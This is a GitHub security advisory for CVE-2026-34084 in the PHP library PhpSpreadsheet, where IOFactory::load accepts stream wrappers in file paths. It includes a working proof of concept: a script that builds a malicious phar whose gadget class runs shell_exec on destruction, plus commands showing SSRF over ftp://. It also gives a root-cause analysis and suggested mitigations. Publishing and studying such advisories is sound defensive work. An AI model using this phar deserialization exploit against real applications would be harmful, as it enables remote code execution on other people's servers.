# [C] PhpSpreadsheet has SSRF/RCE in IOFactory::load when $filename is user controlled

## Summary
Severity: Critical
Advisory: GHSA-q4q6-r8wh-5cgh
CVE: CVE-2026-34084
CWE: CWE-502, CWE-918
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-04-29
Source: https://github.com/advisories/GHSA-q4q6-r8wh-5cgh
Type: github-advisory

## Affected
- Packagist: `phpoffice/phpspreadsheet` — affected >=4.0.0 <5.6.0
- Packagist: `phpoffice/phpspreadsheet` — affected >=3.3.0 <3.10.4
- Packagist: `phpoffice/phpspreadsheet` — affected >=2.2.0 <2.4.4
- Packagist: `phpoffice/phpspreadsheet` — affected >=2.0.0 <2.1.15
- Packagist: `phpoffice/phpspreadsheet` — affected >=0 <1.30.3

## Details
The usage of `is_file`, used to verify if the `$filename` is indeed an actual file, by all(?) `Reader` implementations (inside the helper function `File::assertFile`) is php-wrapper aware, for any [php wrappers](https://www.php.net/manual/en/wrappers.php) implementing `stat()`.
The 3 wrappers `ftp://`, `phar://` and `ssh2.sftp://`, all satisfy this requirement - 2 of which are shown in the PoC below.

This results in a SSRF, at "best", and RCE at worse.

This was tested against the `latest` release - but the issue seems to go back a while from a first quick check (still present in `v1.30.2`).

## PoC
To reproduce the vulnerable behavior, the following scripts were used:

`php.ini` file, only needed to build the malicious phar, not necessary to exploit on a deployed instance of the library:
```ini
phar.readonly=0
```

`make_phar.php` to create the malicious file:
```php
<?php
// php -c php.ini make_phar.php
class GadgetClass {
    public $data;
    function __construct($d) {
        $this->data = $d;
    }
    function __destruct() {
        shell_exec($this->data);
    }
}

$pop = new GadgetClass('touch /tmp/poc.txt');

$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->addFromString('whatever', 'dummy content');
$phar->setMetadata($pop);
$phar->stopBuffering();

rename('exploit.phar', 'exploit.xlsx'); // optional
echo "exploit.xlsx created \n";

```

`test.php` showcases the unsafe pattern:
```php
<?php
require 'vendor/autoload.php';

use PhpOffice\PhpSpreadsheet\IOFactory;

class GadgetClass {
    public $data;
    function __construct($d) {
        $this->data = $d;
    }
    function __destruct() {
        shell_exec($this->data);
    }
}

$filename = $argv[1] ?? null;

if (!$filename) {
    echo "Usage: php test.php <path>\n";
    echo "  e.g. php test.php phar://exploit.xlsx/whatever\n";
    exit(1);
}

echo "Calling IOFactory::load('" . $filename . "')\n";

try {
    $spreadsheet = IOFactory::load($filename);
    var_dump($spreadsheet);
} catch (Throwable $e) {
    echo "Vuln has still triggered even if exception triggers.\n";
}


```
### RCE 
Run the PoC (for RCE):
```bash
php -c php.ini make_phar.php && php test.php phar://exploit.xlsx/test; ls -lah /tmp/poc.txt
```
The file `/tmp/poc.txt` should now be present on disk.
> Note: the vuln still triggers if the file pointed to inside the phar does not exist/is not supported (html, xlsx, etc...). This means an attacker could "silently" trigger the vuln without leaving any error logs if the file inside the phar exists and is supported instead. 

### SSRF
Run the PoC (for SSRF):
```bash
ncat -lvp 21 #run on another terminal
php test.php ftp://127.0.0.1:21/test
```

Observe a connection is made to `127.0.0.1` on port `21`.



## Root Cause Analysis 

Following the API exposed by the library, using `IOFactory::load`, the code proceeds as follows:
```php
IOFactory::load($filename) -> IReader::load($filename, $flags) -> IReader::loadSpreadsheetFromFile($filename) ->  File::assertFile($filename, ...) -> is_file($filename);
```


The one obvious gadget that was found is guarded via `__unserialize` (or `__wakeup` in older versions) in the `XMLWriter` class, making it not possible to use the phar deserialization as a standalone attack vector using just this library - it is still viable to create "POP" gadget chains via other classes which may be available in real-world deployment scenarios.

```php
    public function __destruct()
    {
        // Unlink temporary files
        // There is nothing reasonable to do if unlink fails.
        if ($this->tempFileName != '') {
            @unlink($this->tempFileName);
        }
    }

    /** @param mixed[] $data */
    public function __unserialize(array $data): void
    {
        $this->tempFileName = '';

        throw new SpreadsheetException('Unserialize not permitted');
    }
```

Phpspreadsheet is used as a backbone for many library wrappers, including very widespread ones from [packagist ](https://packagist.org)like `maatwebsite/excel` for Laravel, `sonata-project/exporter` and so on, hence the deserialization vector stays relevant in other contexts.

## Suggested mitigations

Use `is_file` only after making sure the filename does not contain any php wrapper:
```php
$scheme = parse_url($filename, PHP_URL_SCHEME);
// strlen check > 1 to avoid issues with Windows absolute paths (e.g. C:\...), Windows quirks :)
// since no built-in or commonly registered PHP stream wrapper uses a single-character scheme, this should be ok, to my knowledge
if ($scheme !== null && strlen($scheme) > 1) {
    throw new \PhpOffice\PhpSpreadsheet\Exception(
        "Stream wrappers are not permitted as file paths: {$filename}"
    );
}
```

or perhaps even just passing it to `realpath` before calling `is_file` to ensure it is parsed correctly:
```php
$real = realpath($filename); // not php wrapper aware AFAIK
if ($real === false) {
    throw new \PhpOffice\PhpSpreadsheet\Exception("Invalid file path: {$filename}");
}

// from here on, $real should be a clean absolute path so we can pass it to is_file()
if (!is_file($real)) {
    throw new ...
}
```

> Note: `stream_is_local()` would also not be safe here — as it considers `phar://` to be local and would not block it.

## References
- https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-q4q6-r8wh-5cgh
- https://nvd.nist.gov/vuln/detail/CVE-2026-34084
- https://github.com/PHPOffice/PhpSpreadsheet
- https://www.php.net/manual/en/wrappers.php
